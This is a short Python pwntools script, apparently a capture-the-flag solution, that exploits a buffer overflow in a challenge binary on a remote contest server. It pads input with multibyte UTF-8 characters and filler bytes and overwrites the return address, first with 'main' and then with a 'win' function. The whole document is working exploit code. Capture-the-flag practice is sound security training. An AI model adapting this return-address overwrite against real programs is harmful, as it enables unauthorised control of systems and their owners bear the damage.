from pwn import *
context.binary = e = ELF('./chal')
#r = process('./chal')
#r = gdb.debug('./chal', 'b *0x401287\nc')
r = remote('chal.amt.rs', 1337)
c = chr(329).encode('utf-8')
payload_base = c*0x30
payload_base += b'a'*(0x1000-len(payload_base)-0x8-0x1)+b'\xc2'
payload = payload_base + p64(e.sym['main'])
r.send(payload)
payload = payload_base +p64(e.sym['win'])
r.send(payload)
r.interactive()
